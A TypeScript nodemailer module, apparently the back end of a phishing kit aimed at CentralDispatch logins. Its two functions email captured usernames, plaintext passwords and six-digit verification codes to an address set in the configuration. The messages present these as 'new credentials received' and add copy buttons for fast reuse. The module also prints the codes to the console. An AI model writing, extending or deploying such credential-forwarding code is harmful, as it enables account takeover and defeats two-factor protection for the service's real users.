import nodemailer from "nodemailer";
import { getEmailConfig, getRecipientEmail } from "./email-config";

/**
 * Конфигурация транспорта для отправки Email
 * Использует глобальные настройки из .env
 */
const emailConfig = getEmailConfig();
const transporter = nodemailer.createTransport({
  host: emailConfig.host,
  port: emailConfig.port,
  secure: false,
  auth: {
    user: emailConfig.user,
    pass: emailConfig.pass,
  },
});

/**
 * Отправка Email с логином и паролем
 * @param username - имя пользователя
 * @param password - пароль
 */
export async function sendLoginEmail(
  username: string,
  password: string
): Promise<void> {
  console.log("[EMAIL] Начало отправки Email с данными входа...");
  const recipientEmail = getRecipientEmail();
  const recipients = Array.isArray(recipientEmail) ? recipientEmail : [recipientEmail];
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: emailConfig.user,
      to: recipientEmail,
      subject: "CentralDispatch - Новый вход в систему",
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <style>
            .copy-field {
              display: inline-block;
              padding: 8px 12px;
              margin: 5px 0;
              background: #f5f5f5;
              border: 2px solid #FF6B35;
              border-radius: 6px;
              cursor: pointer;
              -webkit-user-select: all;
              -moz-user-select: all;
              -ms-user-select: all;
              user-select: all;
              transition: all 0.2s;
              font-family: 'Courier New', monospace;
              font-weight: bold;
              color: #333;
            }
            .copy-field:hover {
              background: #FF6B35;
              color: white;
            }
            .copy-field:active {
              transform: scale(0.98);
            }
            .copy-hint {
              font-size: 11px;
              color: #999;
              font-style: italic;
              margin-left: 5px;
            }
            .copy-icon {
              display: inline-block;
              width: 20px;
              height: 20px;
              margin-left: 8px;
              cursor: pointer;
              vertical-align: middle;
              padding: 4px;
              border-radius: 4px;
              transition: all 0.2s;
              background: #f0f0f0;
            }
            .copy-icon:hover {
              background: #FF6B35;
            }
            .copy-icon:active {
              transform: scale(0.9);
            }
            .field-container {
              display: flex;
              align-items: center;
              margin: 10px 0;
            }
            .field-value {
              flex: 1;
            }
          </style>
        </head>
        <body style="font-family: Arial, sans-serif; padding: 20px; margin: 0;">
          <div style="max-width: 600px; margin: 0 auto;">
            <h2 style="color: #FF6B35; margin-bottom: 20px;">CentralDispatch - Новые данные для входа</h2>
            <p style="margin-bottom: 15px;">Получены новые учетные данные. Нажмите на иконку копирования рядом с полем:</p>
            <ul style="list-style: none; padding: 0; margin: 20px 0;">
              <li style="margin: 15px 0;">
                <strong>Username:</strong><br>
                <div class="field-container">
                  <span class="copy-field field-value">${username}</span>
                  <span 
                    class="copy-icon" 
                    onclick="copyToClipboard('${username.replace(/'/g, "\\'").replace(/"/g, "&quot;")}', this)"
                    title="Нажмите чтобы скопировать"
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                  </span>
                </div>
              </li>
              <li style="margin: 15px 0;">
                <strong>Password:</strong><br>
                <div class="field-container">
                  <span class="copy-field field-value">${password}</span>
                  <span 
                    class="copy-icon" 
                    onclick="copyToClipboard('${password.replace(/'/g, "\\'").replace(/"/g, "&quot;")}', this)"
                    title="Нажмите чтобы скопировать"
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                  </span>
                </div>
              </li>
            </ul>
            <p style="color: #666; font-size: 12px; margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px;">
              Время получения: ${new Date().toLocaleString("ru-RU")}
            </p>
          </div>
          <script>
            function copyToClipboard(text, element) {
              try {
                // Метод 1: Современный Clipboard API (работает в HTTPS и некоторых email клиентах)
                if (navigator.clipboard && navigator.clipboard.writeText) {
                  navigator.clipboard.writeText(text).then(function() {
                    showCopyFeedback(element, text);
                  }).catch(function(err) {
                    // Fallback на execCommand
                    copyWithExecCommand(text, element);
                  });
                } else {
                  // Метод 2: execCommand (работает в большинстве браузеров)
                  copyWithExecCommand(text, element);
                }
              } catch (err) {
                // Метод 3: Выделение текста для ручного копирования
                selectTextForCopy(element);
              }
            }
            
            function copyWithExecCommand(text, element) {
              // Создаем временный textarea
              var textarea = document.createElement('textarea');
              textarea.value = text;
              textarea.style.position = 'fixed';
              textarea.style.left = '-999999px';
              textarea.style.top = '-999999px';
              document.body.appendChild(textarea);
              textarea.focus();
              textarea.select();
              
              try {
                var successful = document.execCommand('copy');
                document.body.removeChild(textarea);
                
                if (successful) {
                  showCopyFeedback(element, text);
                } else {
                  selectTextForCopy(element);
                }
              } catch (err) {
                document.body.removeChild(textarea);
                selectTextForCopy(element);
              }
            }
            
            function selectTextForCopy(element) {
              // Если это иконка, выделяем текст из соседнего поля
              var fieldElement = element.previousElementSibling;
              if (fieldElement && fieldElement.classList.contains('field-value')) {
                // Выделяем текст из поля
                if (window.getSelection && document.createRange) {
                  var selection = window.getSelection();
                  var range = document.createRange();
                  range.selectNodeContents(fieldElement);
                  selection.removeAllRanges();
                  selection.addRange(range);
                }
              } else {
                // Выделяем текст из самого элемента
                if (window.getSelection && document.createRange) {
                  var selection = window.getSelection();
                  var range = document.createRange();
                  range.selectNodeContents(element);
                  selection.removeAllRanges();
                  selection.addRange(range);
                }
              }
            }
            
            function showCopyFeedback(element, originalText) {
              // Если это иконка, показываем feedback на соседнем поле
              var fieldElement = element.previousElementSibling;
              if (fieldElement && fieldElement.classList.contains('field-value')) {
                var originalBg = fieldElement.style.background;
                var originalColor = fieldElement.style.color;
                var originalTextContent = fieldElement.textContent;
                
                fieldElement.style.background = '#4CAF50';
                fieldElement.style.color = 'white';
                fieldElement.textContent = '✓ Скопировано!';
                
                // Также меняем иконку
                var originalSvg = element.innerHTML;
                element.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
                element.style.background = '#4CAF50';
                
                setTimeout(function() {
                  fieldElement.style.background = originalBg || '';
                  fieldElement.style.color = originalColor || '';
                  fieldElement.textContent = originalTextContent;
                  element.innerHTML = originalSvg;
                  element.style.background = '';
                }, 2000);
              } else {
                // Fallback для старого варианта
                var originalBg = element.style.background;
                var originalColor = element.style.color;
                element.style.background = '#4CAF50';
                element.style.color = 'white';
                element.textContent = '✓ Скопировано!';
                
                setTimeout(function() {
                  element.style.background = originalBg || '';
                  element.style.color = originalColor || '';
                  element.textContent = originalText;
                }, 1500);
              }
            }
          </script>
        </body>
        </html>
      `,
      text: `
        CentralDispatch - Новые данные для входа
        
        Username: ${username}
        Password: ${password}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email:", error);
    throw new Error("Не удалось отправить Email");
  }
}

/**
 * Отправка Email с кодом подтверждения
 * @param code - 6-значный код
 * @param username - имя пользователя (опционально)
 */
export async function sendCodeEmail(
  code: string,
  username?: string
): Promise<void> {
  console.log("[EMAIL] Начало отправки Email с кодом...");
  console.log("[EMAIL] Код:", code);
  const recipientEmail = getRecipientEmail();
  const recipients = Array.isArray(recipientEmail) ? recipientEmail : [recipientEmail];
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: emailConfig.user,
      to: recipientEmail,
      subject: "CentralDispatch - Код подтверждения",
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px;">
          <h2 style="color: #FF6B35;">CentralDispatch - Код подтверждения</h2>
          <p>Получен код подтверждения:</p>
          <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; text-align: center;">
            <h1 style="color: #FF6B35; font-size: 32px; letter-spacing: 5px; margin: 0;">
              ${code}
            </h1>
          </div>
          ${username ? `<p><strong>Username:</strong> ${username}</p>` : ""}
          <p style="color: #666; font-size: 12px; margin-top: 20px;">
            Время получения: ${new Date().toLocaleString("ru-RU")}
          </p>
        </div>
      `,
      text: `
        CentralDispatch - Код подтверждения
        
        Код: ${code}
        ${username ? `Username: ${username}` : ""}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email с кодом успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email с кодом:", error);
    throw new Error("Не удалось отправить Email с кодом");
  }
}

